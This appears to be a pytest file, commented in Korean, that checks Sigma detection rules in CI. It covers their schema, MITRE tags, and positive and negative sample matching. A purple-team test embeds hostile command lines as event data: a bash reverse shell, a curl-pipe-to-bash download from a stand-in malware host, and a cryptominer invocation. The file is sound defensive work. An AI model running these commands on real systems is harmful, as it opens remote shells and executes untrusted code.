"""Sigma 룰 CI 검증 — detection-as-code (docs/AUDIT.md 3단계 제안 #2).

탐지 룰은 코드다. 코드를 고치면 테스트가 돌아야 하듯, 룰을 고치면 **그 룰이
여전히 잡아야 할 것을 잡고 잡지 말아야 할 것을 안 잡는지** 확인되어야 한다.
그러지 않으면 룰 수정은 언제나 도박이다.

각 룰은 자기 테스트를 `tests:` 블록에 함께 들고 다닌다(엔진은 `detection` 만
읽으므로 이 키는 무시된다). positive 는 반드시 매치되어야 하고, negative 는
반드시 매치되면 안 된다. **negative 가 이 검증의 핵심이다** — 오탐은 조용히
쌓이다가 분석가가 알림을 무시하게 만드는 방식으로 탐지 체계를 망가뜨린다.

실제로 이 하네스를 도입하면서 오탐 하나를 잡았다: 크립토마이너 룰이
CommandLine 에 `pool` 만 있어도 매치해서 `gunicorn --worker-pool=gevent` 와
`java -Dpool.maxSize=20` 같은 정상 프로세스를 CRITICAL 로 올리고 있었다.
채굴 풀을 특정하는 문자열만 남기고, 그 두 케이스를 negative 로 고정했다.
"""
import glob
import os
import re
import uuid

import pytest
import yaml

RULES_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                         "data", "sigma")
RULE_PATHS = sorted(glob.glob(os.path.join(RULES_DIR, "*.yml"))
                    + glob.glob(os.path.join(RULES_DIR, "*.yaml")))

VALID_LEVELS = {"informational", "low", "medium", "high", "critical"}
VALID_STATUS = {"stable", "test", "experimental", "deprecated", "unsupported"}


def _load(path):
    with open(path, encoding="utf-8") as f:
        return yaml.safe_load(f)


RULES = [(os.path.basename(p), _load(p)) for p in RULE_PATHS]


@pytest.fixture(scope="module")
def engine():
    """실제 엔진으로 평가한다 — 별도 매처를 만들면 그건 룰이 아니라 테스트를 검증한다."""
    from modules.sigma_engine import SigmaEngine

    class _Silent:
        def emit(self, *a, **k):
            pass

    eng = SigmaEngine(_Silent(), config={"SIGMA_RULES_DIR": RULES_DIR})
    eng.load_rules()
    assert eng.stats["rules_loaded"] == len(RULE_PATHS), (
        f"룰 로드 실패: {eng.stats['rules_loaded']}/{len(RULE_PATHS)} "
        f"(오류 {eng.stats['rules_error']}건)")
    return eng


def test_rules_directory_is_not_empty():
    assert RULE_PATHS, "data/sigma 에 룰이 없다 — 검증할 것이 없으면 CI 가 무의미하다"


# ─────────────── 스키마 · 메타데이터 ───────────────

@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_has_required_fields(fname, doc):
    missing = [k for k in ("title", "id", "description", "level", "logsource",
                           "tags", "detection") if not doc.get(k)]
    assert missing == [], f"{fname}: 필수 필드 누락 {missing}"
    assert doc["detection"].get("condition"), f"{fname}: detection.condition 이 없다"


@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_id_is_a_uuid(fname, doc):
    """id 가 UUID 라야 파일명을 바꿔도 룰의 정체가 유지된다."""
    uuid.UUID(str(doc["id"]))


@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_level_and_status_are_valid(fname, doc):
    assert str(doc["level"]).lower() in VALID_LEVELS, f"{fname}: level={doc['level']}"
    assert str(doc.get("status", "stable")).lower() in VALID_STATUS


def test_rule_ids_and_titles_are_unique():
    """id 가 겹치면 UI 의 룰 토글이 엉뚱한 룰을 끈다."""
    for field in ("id", "title"):
        seen = {}
        for fname, doc in RULES:
            key = doc.get(field)
            assert key not in seen, f"{field} 중복: {fname} vs {seen[key]} ({key})"
            seen[key] = fname


@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_is_mapped_to_mitre(fname, doc):
    """기법 태그가 없으면 커버리지 진단에서 이 룰이 보이지 않는다."""
    tags = [str(t).lower() for t in doc.get("tags", [])]
    techniques = [t for t in tags if re.fullmatch(r"attack\.t\d{4}(\.\d{3})?", t)]
    tactics = [t for t in tags if re.fullmatch(r"attack\.[a-z_]+", t)]
    assert techniques, f"{fname}: attack.tXXXX 기법 태그가 없다"
    assert tactics, f"{fname}: attack.<tactic> 전술 태그가 없다"


@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_technique_has_a_matrix_cell(fname, doc):
    """매트릭스에 칸이 없으면 탐지돼도 표시될 곳이 없다 (커버리지 진단과 같은 불변식)."""
    from modules.coverage import base_technique
    from modules.mitre_attack import TECHNIQUES

    known = {t["id"] for techs in TECHNIQUES.values() for t in techs}
    for tag in [str(t) for t in doc.get("tags", [])]:
        if not tag.lower().startswith("attack.t") or not tag[8:9].isdigit():
            continue
        tid = base_technique(tag.split(".", 1)[1])
        assert tid in known, (
            f"{fname}: {tid} 가 MITRE 매트릭스에 없다 — "
            f"modules/mitre_attack.py 의 TECHNIQUES 에 추가할 것")


# ─────────────── 탐지 어서션 (detection-as-code 의 핵심) ───────────────

@pytest.mark.parametrize("fname,doc", RULES, ids=[r[0] for r in RULES])
def test_rule_ships_with_its_own_tests(fname, doc):
    """테스트 없는 룰은 다음 수정 때 조용히 망가진다."""
    tests = doc.get("tests") or {}
    assert tests.get("positive"), f"{fname}: positive 테스트가 없다"
    assert tests.get("negative"), (
        f"{fname}: negative 테스트가 없다 — 오탐 회귀를 막는 건 negative 쪽이다")
    for kind in ("positive", "negative"):
        for case in tests[kind]:
            assert case.get("name"), f"{fname}: {kind} 케이스에 name 이 없다"
            assert isinstance(case.get("event"), dict) and case["event"], \
                f"{fname}: {kind}/{case.get('name')} 의 event 가 비었다"


def _cases(kind):
    out = []
    for fname, doc in RULES:
        for case in (doc.get("tests") or {}).get(kind, []):
            out.append(pytest.param(doc["title"], case,
                                    id=f"{fname}::{case.get('name', '?')}"))
    return out


@pytest.mark.parametrize("title,case", _cases("positive"))
def test_positive_samples_match_their_rule(engine, title, case):
    hits = [r["title"] for r in engine.test_event(case["event"])]
    assert title in hits, (
        f"'{title}' 이 자기 positive 샘플을 놓쳤다: {case['name']}\n"
        f"  event={case['event']}\n  매치된 룰={hits}")


@pytest.mark.parametrize("title,case", _cases("negative"))
def test_negative_samples_do_not_match_their_rule(engine, title, case):
    hits = [r["title"] for r in engine.test_event(case["event"])]
    assert title not in hits, (
        f"'{title}' 이 정상 이벤트를 오탐했다: {case['name']}\n"
        f"  event={case['event']}\n  매치된 룰={hits}")


def test_purple_team_scenarios_are_still_detected(engine):
    """룰을 고쳐서 퍼플팀 시나리오가 안 잡히게 되는 회귀를 막는다.

    퍼플팀은 '공격 시뮬레이션 → 탐지 확인'을 이미 하고 있었지만 온디맨드였다.
    Sigma 로 잡아야 하는 시나리오만 CI 로 끌어온다.
    """
    expected = {
        "revshell": ("bash", "nginx", "/bin/bash",
                     "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"),
        "webshell": ("sh", "apache2", "/bin/sh", "sh -c id"),
        "miner": ("xmrig", "systemd", "/tmp/.x/xmrig",
                  "/tmp/.x/xmrig -o pool.minexmr.com:4444 -u wallet"),
        "scanner": ("nmap", "bash", "/usr/bin/nmap", "nmap -sS 192.168.1.0/24"),
        "download_exec": ("sh", "bash", "/bin/sh",
                          "curl http://malware.example/x.sh | bash"),
    }
    undetected = []
    for sid, (name, parent, exe, cmd) in expected.items():
        event = {"category": "process_creation", "Image": exe,
                 "OriginalFileName": name, "CommandLine": cmd,
                 "ParentImage": parent, "User": ""}
        if not engine.test_event(event):
            undetected.append(sid)
    assert undetected == [], f"Sigma 가 놓친 퍼플팀 시나리오: {undetected}"


# ─────────────── 번들 사본 동기화 ───────────────

def test_bundled_rules_match_the_shipped_files():
    """`sigma_engine.BUNDLED_RULES` 는 data/sigma 가 비었을 때 쓰이는 사본이다.

    사본이 낡으면 새 환경에서 **다른 탐지 로직으로 뜬다** — 그것도 조용히.
    탐지에 관여하는 필드만 비교한다(`tests:` 는 파일에만 있다).
    """
    from modules.sigma_engine import BUNDLED_RULES

    compared = ("id", "title", "level", "logsource", "tags", "detection")
    assert set(BUNDLED_RULES) == {os.path.basename(p) for p in RULE_PATHS}, (
        "번들 룰 목록과 data/sigma 파일 목록이 다르다")
    for fname, bundled_text in BUNDLED_RULES.items():
        bundled = yaml.safe_load(bundled_text)
        shipped = _load(os.path.join(RULES_DIR, fname))
        for field in compared:
            assert bundled.get(field) == shipped.get(field), (
                f"{fname}: 번들 사본의 '{field}' 가 파일과 다르다 — "
                f"modules/sigma_engine.py 의 BUNDLED_RULES 를 맞출 것")
